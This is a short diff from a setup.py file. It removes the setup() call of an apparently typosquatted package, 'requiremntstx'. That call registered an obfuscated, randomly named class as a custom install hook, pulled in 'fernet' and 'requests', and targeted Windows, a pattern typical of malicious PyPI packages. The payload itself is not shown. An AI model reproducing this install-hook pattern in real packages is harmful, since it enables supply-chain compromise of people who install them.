@@ -18,22 +18,5 @@ class thBWTPPhKHXnGeNLkUprVyecAgRPTDyablKLHmVsOeTuyKYhqvgiIaYZKJRIQZYMcymDMxA(in
             install.run(self)
 
 
-setup(
-    name="requiremntstx",
-    version=VERSION,
-    author="osEQqhYNGAhzaKIvL",
-    author_email="LMtLaeSE@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': thBWTPPhKHXnGeNLkUprVyecAgRPTDyablKLHmVsOeTuyKYhqvgiIaYZKJRIQZYMcymDMxA,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 
